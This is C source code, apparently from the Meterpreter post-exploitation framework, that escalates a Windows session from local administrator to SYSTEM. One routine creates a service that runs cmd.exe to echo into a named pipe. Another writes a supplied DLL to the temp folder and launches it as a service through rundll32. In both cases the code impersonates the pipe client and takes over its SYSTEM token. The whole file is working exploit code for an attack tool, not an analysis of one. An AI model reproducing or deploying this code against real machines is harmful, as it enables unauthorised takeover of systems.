#include "precomp.h"
#include "namedpipe.h"
#include "service.h"

/*
 * Worker thread for named pipe impersonation. Creates a named pipe and impersonates 
 * the first client which connects to it.
 */
DWORD THREADCALL elevate_namedpipe_thread( THREAD * thread )
{
	DWORD dwResult              = ERROR_ACCESS_DENIED;
	HANDLE hServerPipe          = NULL;
	HANDLE hToken               = NULL;
	HANDLE hTokenDup            = NULL;
	char * cpServicePipe        = NULL;
	Remote * remote             = NULL;
	BYTE bMessage[128]          = {0};
	DWORD dwBytes               = 0;

	do
	{
		if( !thread )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. invalid thread", ERROR_BAD_ARGUMENTS );

		cpServicePipe = (char *)thread->parameter1;
		remote        = (Remote *)thread->parameter2;

		if( !cpServicePipe || !remote )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. invalid thread arguments", ERROR_BAD_ARGUMENTS );

		dprintf("[ELEVATE] pipethread. CreateNamedPipe(%s)",cpServicePipe);

		// create the named pipe for the client service to connect to
		hServerPipe = CreateNamedPipe( cpServicePipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL );
		if( !hServerPipe )
			BREAK_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. CreateNamedPipe failed" );

		while( TRUE )
		{
			if( event_poll( thread->sigterm, 0 ) )
				BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. thread->sigterm received", ERROR_DBG_TERMINATE_THREAD );

			// wait for a client to connect to our named pipe...
			if( !ConnectNamedPipe( hServerPipe, NULL ) )
			{
				if( GetLastError() != ERROR_PIPE_CONNECTED )
					continue;
			}

			dprintf("[ELEVATE] pipethread. got client conn.");

			// we can't impersonate a client untill we have performed a read on the pipe...
			if( !ReadFile( hServerPipe, &bMessage, 1, &dwBytes, NULL ) )
				CONTINUE_ON_ERROR( "[ELEVATE] pipethread. ReadFile failed" );

			// impersonate the client!
			if( !ImpersonateNamedPipeClient( hServerPipe ) )
				CONTINUE_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. ImpersonateNamedPipeClient failed" );

			// get a handle to this threads token
			if( !OpenThreadToken( GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken ) )
				CONTINUE_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. OpenThreadToken failed" );

			// duplicate it into a primary token
			if( ! DuplicateTokenEx( hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup ) )
				CONTINUE_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. DuplicateTokenEx failed" );

			// now we can set the meterpreters thread token to that of our system 
			// token so all subsequent meterpreter threads will use this token.
			core_update_thread_token( remote, hTokenDup );

			dwResult = ERROR_SUCCESS;

			break;
		}

	} while( 0 );

	if( hServerPipe )
	{
		DisconnectNamedPipe( hServerPipe );
		CLOSE_HANDLE( hServerPipe );
	}

	dprintf( "[ELEVATE] elevate_namedpipe_thread finishing, dwResult=%d", dwResult );

	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a cmd.exe under local 
 * system which then connects to our named pipe and we impersonate this client. This can be done by an 
 * Administrator without the need for SeDebugPrivilege.  Works on 2000, XP, 2003 and 2008 for all local 
 * administrators. On Vista and 7 it will only work if the host process has been elevated through UAC
 * first. Does not work on NT4.
 */
DWORD elevate_via_service_namedpipe( Remote * remote, Packet * packet )
{
	DWORD dwResult              = ERROR_SUCCESS;
	char * cpServiceName        = NULL;
	THREAD * pThread            = NULL;
	char cServiceArgs[MAX_PATH] = {0};
	char cServicePipe[MAX_PATH] = {0};
	OSVERSIONINFO os            = {0};

	do
	{
		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe: GetVersionEx failed" )

		// filter out Windows NT4
		if ( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported." )
		}

		cpServiceName = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
		if( !cpServiceName )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. invalid arguments", ERROR_BAD_ARGUMENTS );

		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );
		
		_snprintf( cServiceArgs, MAX_PATH, "cmd.exe /c echo %s > %s", cpServiceName, cServicePipe );

		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote );
		if( !pThread )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. thread_create failed", ERROR_INVALID_HANDLE );

		if( !thread_run( pThread ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. thread_run failed", ERROR_ACCESS_DENIED );

		Sleep( 500 ); // to-do: use signals to synchronize when the named pipe server is ready...

		// start the elevator service (if it doesnt start first time we need to create it and then start it).
		if( service_start( cpServiceName ) != ERROR_SUCCESS )
		{
			if( service_create( cpServiceName, cServiceArgs ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe. service_create failed" );
			// we dont check a return value for service_start as we expect it to fail as cmd.exe is not
			// a valid service and it will never signal to the service manager that is is a running service.
			service_start( cpServiceName );
		}

		// signal our thread to terminate if it is still running
		thread_sigterm( pThread );
		
		// and wait for it to terminate...
		thread_join( pThread );

		// get the exit code for our pthread
		if( !GetExitCodeThread( pThread->handle, &dwResult ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. GetExitCodeThread failed", ERROR_INVALID_HANDLE );
		
	} while( 0 );

	if( cpServiceName )
	{
		service_stop( cpServiceName );
		service_destroy( cpServiceName );
	}

	if( pThread )
		thread_destroy( pThread );

	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a service under local 
 * system which then connects to our named pipe and we impersonate this client. This can be done by an 
 * Administrator without the need for SeDebugPrivilege, however a dll (elevator.dll) must be written to 
 * disk. Works on NT4, 2000, XP, 2003 and 2008 for all local administrators. On Vista and 7 it will only 
 * work if the host process has been elevated through UAC first.
 */
DWORD elevate_via_service_namedpipe2( Remote * remote, Packet * packet )
{
	DWORD dwResult              = ERROR_SUCCESS;
	THREAD * pThread            = NULL;
	HANDLE hServiceFile         = NULL;
	LPVOID lpServiceBuffer      = NULL;
	char * cpServiceName        = NULL;
	THREAD * pthread            = NULL;
	char cServicePath[MAX_PATH] = {0};
	char cServiceArgs[MAX_PATH] = {0};
	char cServicePipe[MAX_PATH] = {0};
	char cTempPath[MAX_PATH]    = {0};
	DWORD dwBytes               = 0;
	DWORD dwTotal               = 0;
	DWORD dwServiceLength       = 0;

	do
	{
		cpServiceName   = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
		dwServiceLength = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
		lpServiceBuffer = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_DLL );

		if( !cpServiceName || !dwServiceLength || !lpServiceBuffer )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. invalid arguments", ERROR_BAD_ARGUMENTS );

		if( GetTempPath( MAX_PATH, (LPSTR)&cTempPath ) == 0 )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. GetTempPath failed" );

		if( cTempPath[ strlen(cTempPath) - 1 ] == '\\' )
			_snprintf( cServicePath, MAX_PATH, "%s%s.dll", cTempPath, cpServiceName );
		else
			_snprintf( cServicePath, MAX_PATH, "%s\\%s.dll", cTempPath, cpServiceName );

		_snprintf( cServiceArgs, MAX_PATH, "rundll32.exe %s,a /p:%s", cServicePath, cpServiceName );
		
		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );

		// write service dll to temp path...
		hServiceFile = CreateFile( cServicePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
		if( !hServiceFile )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. CreateFile hServiceFile failed" );
		
		while( dwTotal < dwServiceLength )
		{
			if( !WriteFile( hServiceFile, (LPCVOID)((LPBYTE)lpServiceBuffer + dwTotal), (dwServiceLength - dwTotal), &dwBytes, NULL ) )
				break;
			dwTotal += dwBytes;
		}
		
		CLOSE_HANDLE( hServiceFile );

		if( dwTotal != dwServiceLength )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. WriteFile hServiceFile failed", ERROR_BAD_LENGTH );

		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote );
		if( !pThread )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. thread_create failed", ERROR_INVALID_HANDLE );

		if( !thread_run( pThread ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. thread_create failed", ERROR_ACCESS_DENIED );

		Sleep( 500 );

		// start the elevator service (if it doesnt start first time we need to create it and then start it).
		if( service_start( cpServiceName ) != ERROR_SUCCESS )
		{
			if( service_create( cpServiceName, cServiceArgs ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. service_create failed" );

			if( service_start( cpServiceName ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. service_start failed" );
		}
	
		WaitForSingleObject( pThread->handle, 10000 );

		thread_sigterm( pThread );
		
		thread_join( pThread );

		// get the exit code for our pthread
		if( !GetExitCodeThread( pThread->handle, &dwResult ) )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. GetExitCodeThread failed", ERROR_INVALID_HANDLE );
		
	} while( 0 );

	if( cpServiceName )
	{
		service_stop( cpServiceName );
		service_destroy( cpServiceName );
	}

	if( strlen( cServicePath ) > 0 )
	{
		DWORD dwIndex = 20;
		while( dwIndex-- )
		{
			if( DeleteFile( cServicePath ) )
				break;
			Sleep( 500 );
		}
	}

	if( pThread )
		thread_destroy( pThread );

	return dwResult;
}
